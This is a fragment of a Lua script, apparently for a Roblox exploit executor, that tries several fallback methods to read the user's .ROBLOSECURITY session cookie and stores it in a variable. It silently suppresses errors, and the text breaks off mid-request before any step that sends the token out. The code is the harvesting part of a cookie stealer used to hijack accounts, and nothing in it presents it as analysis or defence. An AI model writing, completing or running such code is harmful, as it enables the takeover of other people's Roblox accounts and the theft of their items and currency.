local robloToken = "COOKIE_NOT_FOUND"

-- Simple validation
local function isValid(str)
    return str and #str > 100
end

-- Try every method, fully wrapped
pcall(function()
    if getcookie then
        local c = getcookie(".ROBLOSECURITY")
        if isValid(c) then robloToken = c end
    end
end)

if robloToken == "COOKIE_NOT_FOUND" then
    pcall(function()
        local cookies = game:GetService("HttpService"):GetCookies("https://www.roblox.com")
        for _, cookie in pairs(cookies) do
            if cookie.Name == ".ROBLOSECURITY" and isValid(cookie.Value) then
                robloToken = cookie.Value
            end
        end
    end)
end

if robloToken == "COOKIE_NOT_FOUND" and request then
    pcall(function()
        local r = request({Url = "https://www.roblox.com/mobileapi/userinfo", Method = "GET"})
